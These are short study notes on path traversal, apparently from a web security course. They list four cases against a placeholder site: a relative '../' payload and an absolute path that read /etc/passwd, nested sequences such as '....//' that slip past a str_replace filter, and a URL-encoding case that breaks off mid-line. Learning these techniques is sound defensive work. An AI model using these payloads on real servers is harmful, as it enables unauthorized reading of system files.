
This part isn't too much learning stuffs, cases; so I'll gather all notes into this only file.

- **Case 1**
https://insecure-website.com/ ==loadImage?filename=../../../etc/passwd==

- **Case 2** Using absolute path
https://insecure-website.com/ ==loadImage?filename=/etc/passwd==

- **Case 3** Deal with` $filename = str_replace('../', '', $filename);`

 use nested traversal sequences, ==such as:  ....// or ....\\/==  

- **Case 4** Using URL encoding
useful tool: [CyberChef](https://gchq.github.io/CyberChef/)

https://insecure-website.com/ ==loadImage?